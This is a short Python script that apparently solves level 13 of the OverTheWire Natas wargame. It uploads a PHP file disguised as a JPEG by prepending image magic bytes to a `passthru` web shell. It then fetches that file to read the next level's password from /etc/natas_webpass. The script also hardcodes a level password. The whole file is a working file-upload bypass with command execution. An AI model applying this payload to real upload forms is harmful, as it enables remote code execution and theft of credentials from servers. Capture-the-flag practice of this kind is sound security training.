# -*- coding: utf-8 -*-
from base import get_page, post_page
import re

def natas13():
    username = "natas13"
    password = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
    _content = b'\xFF\xD8\xFF\xE0<? echo passthru("cat /etc/natas_webpass/natas14"); ?>'
    data = {"MAX_FILE_SIZE":1000, "filename":"evil.php"}
    files = {"uploadedfile":("natas13.php", _content)}
    content = post_page(13, username, password, data=data, files=files)
    upload_path = re.findall(r"(upload/\S{10}.php)", content)
    if not upload_path:
        print("Fail to find password")
        return
    else:
        upload_path = upload_path[0]
    password_content = get_page(13, username, password, "/"+upload_path, byte=True)
    print(password_content[4:].decode())

if __name__ == "__main__":
    natas13()